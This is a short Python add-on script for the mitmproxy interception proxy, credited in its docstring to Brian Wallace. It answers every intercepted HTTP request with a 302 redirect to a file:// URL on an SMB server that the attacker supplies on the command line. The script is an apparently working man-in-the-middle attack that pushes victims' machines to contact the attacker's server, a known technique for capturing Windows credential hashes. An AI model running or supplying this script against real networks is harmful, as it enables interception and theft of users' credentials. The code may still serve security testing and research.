from libmproxy.protocol.http import HTTPResponse
from netlib.odict import ODictCaseless

"""
This module redirects all requests to a SMB server (Redirect to SMB)
Developed by Brian Wallace @botnet_hutner
"""


def start(context, argv):
    if len(argv) != 2 and len(argv) != 3:
        raise ValueError('Usage: -s "redirecttosmb.py smbserver-ip [identifier]"')
    # todo Confirm this is an IP address
    context.smbserver_ip = argv[1]
    if len(argv) == 3:
        context.identifier = argv[2]
    else:
        context.identifier = "mitmproxy-identifier"


def request(context, flow):

    should_redirect = True  # Modify this value to disable redirection for the current request

    if should_redirect is not None and should_redirect:
        resp = HTTPResponse(
            [1, 1],
            302,
            "Found",
            ODictCaseless([["Content-Type", "text/html"], ["Location", "file://{0}/{1}".format(context.smbserver_ip,
                                                                                               context.identifier)]]),
            "")
        flow.reply(resp)